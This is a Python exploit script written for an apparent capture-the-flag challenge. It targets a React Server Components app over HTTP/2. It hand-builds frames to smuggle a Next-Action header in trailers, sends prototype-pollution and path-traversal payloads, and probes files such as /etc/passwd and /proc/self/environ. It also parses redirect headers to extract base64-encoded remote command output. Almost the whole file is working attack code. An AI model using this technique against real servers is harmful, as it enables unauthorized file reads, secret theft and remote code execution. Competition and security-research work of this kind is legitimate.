#!/usr/bin/env python3
"""
Final adapted exploit: RSC FormData prototype pollution via HTTP/2 trailers
Based on React2Shell but adapted for FormData reference format
"""
import socket
import ssl
import struct
import time
import base64
import re
import json
from urllib.parse import unquote
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

# Read current action ID
with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def open_h2():
    """Open HTTP/2 TLS connection"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
    sock.sendall(PREFACE)

    # Send empty SETTINGS frame
    settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    sock.sendall(settings_frame)

    return sock

def read_frames(sock, want_stream=1, max_time=15):
    """Read HTTP/2 frames until END_STREAM"""
    frames = []
    end_time = time.time() + max_time

    while time.time() < end_time:
        try:
            # Read frame header (9 bytes)
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            # Read frame payload
            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            frames.append((frame_type, flags, stream_id, payload))

            # Check for END_STREAM (flags & 1)
            if stream_id == want_stream and (flags & 1):
                break

        except socket.timeout:
            break
        except Exception as e:
            print(f"Frame read error: {e}")
            break

    return frames, True

def parse_response(frames):
    """Parse HTTP/2 response frames"""
    headers = {}
    body = b""
    status = None

    for frame_type, flags, stream_id, payload in frames:
        if frame_type == 1:  # HEADERS
            # Simple header parsing - look for status
            if b":status" in payload:
                try:
                    status_match = re.search(rb':status\x03(\d{3})', payload)
                    if status_match:
                        status = status_match.group(1).decode()
                except:
                    pass

            # Look for location header (for RCE result)
            if b"location" in payload:
                try:
                    # Try multiple location header formats
                    patterns = [
                        rb'location[^\x00]*\x00([^\x00]+)',
                        rb'location:\s*([^\r\n]+)',
                        rb'Location:\s*([^\r\n]+)',
                    ]
                    for pattern in patterns:
                        loc_match = re.search(pattern, payload)
                        if loc_match:
                            headers["location"] = loc_match.group(1).decode()
                            break
                except:
                    pass

        elif frame_type == 0:  # DATA
            body += payload

    return status or "200", headers, body

def create_lfi_payload(file_path):
    """Create payload for Local File Inclusion"""
    # Try directory traversal in packet field
    # Maybe the backend reads file content based on packet value
    return json.dumps(["$K1", {
        "packet": file_path,
        "workOrder": "WO-17-04",
        "terminal": "ОП-3",
        "restore": "true"
    }])

def send_lfi_test(file_path):
    """Send LFI test via HTTP/2 trailers"""
    sock = open_h2()
    sid = 1

    # Consume settings ACK
    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Build LFI payload
    body_str = create_lfi_payload(file_path)
    body_bytes = body_str.encode()

    # Prepare headers WITHOUT Next-Action
    enc = Encoder()
    header_block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "lfi-test"),
    ])

    # Prepare trailer with Next-Action
    trailer_block = enc.encode([
        ("next-action", ACTION_ID),
    ])

    # Send HEADERS frame (NO END_STREAM)
    raw = struct.pack(">I", len(header_block))[1:] + b"\x01" + b"\x04" + struct.pack(">I", sid) + header_block
    sock.sendall(raw)

    # Send DATA frame (NO END_STREAM)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + b"\x00" + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)

    # Send HEADERS frame as trailer (END_HEADERS + END_STREAM)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + b"\x05" + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    # Read response
    frames, end = read_frames(sock, want_stream=sid, max_time=20)
    sock.close()

    return parse_response(frames)

def extract_command_result(status, headers, body):
    """Extract command output from response"""
    print(f"[DEBUG] Status: {status}")
    print(f"[DEBUG] Headers: {headers}")

    # Check Location header for RCE output (React2Shell pattern)
    if "location" in headers:
        location = headers["location"]
        print(f"[DEBUG] Location header: {location}")

        # Look for login redirect with base64 result
        match = re.search(r'/login\?a=([^;&]+)', location)
        if match:
            try:
                output_b64 = unquote(match.group(1))
                decoded = base64.b64decode(output_b64).decode('utf-8', errors='ignore')
                return f"RCE SUCCESS: {decoded.strip()}"
            except Exception as e:
                return f"Decode error: {e}"

    # Check RSC body for action result
    body_str = body.decode('utf-8', errors='ignore')

    # Look for row 1 (action result)
    row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
    if row1_match:
        content = row1_match.group(1)
        if "recovery-offline" in content:
            return "Action executed but still recovery-offline (prototype pollution may have failed)"
        elif '"ok":' in content and '"ok":true' in content:
            return "Action returned success - check for side effects"
        elif "digest" in content:
            return f"Action failed with digest: {content}"
        else:
            return f"Unknown action result: {content}"

    return f"No clear result. Status: {status}, Body size: {len(body)}"

def test_lfi_variants():
    """Test different LFI paths"""
    print("=" * 60)
    print("Testing Local File Inclusion")
    print("=" * 60)

    # Common flag locations
    test_paths = [
        "/flag",
        "/flag.txt",
        "/app/flag",
        "/root/flag",
        "/home/flag",
        "/var/flag",
        "../flag",
        "../../flag",
        "../../../flag",
        "../../../../flag",
        "/etc/passwd",  # Test basic LFI
        "/app/package.json",  # App info
        "/proc/self/environ",  # Environment variables
        "/proc/self/cmdline",  # Command line
    ]

    for file_path in test_paths:
        print(f"\n[+] Testing: {file_path}")

        try:
            status, headers, body = send_lfi_test(file_path)
            result = extract_command_result(status, headers, body)

            if "alfa{" in result:
                print(f"[!] FLAG FOUND in {file_path}: {result}")
                return True
            elif "recovery-offline" not in result and "digest" not in result:
                print(f"    Different behavior: {result}")
            else:
                print(f"    Standard result: {result[:50]}...")

        except Exception as e:
            print(f"    Error: {e}")

    return False

def main():
    success = test_lfi_variants()

    if not success:
        print("\n" + "=" * 60)
        print("LFI attempt completed without finding flag.")
        print("The flag may be:")
        print("1. In a different location")
        print("2. Requires RCE to access")
        print("3. Hidden in the action logic itself")
        print("4. Requires proper PLC authorization sequence")

if __name__ == "__main__":
    main()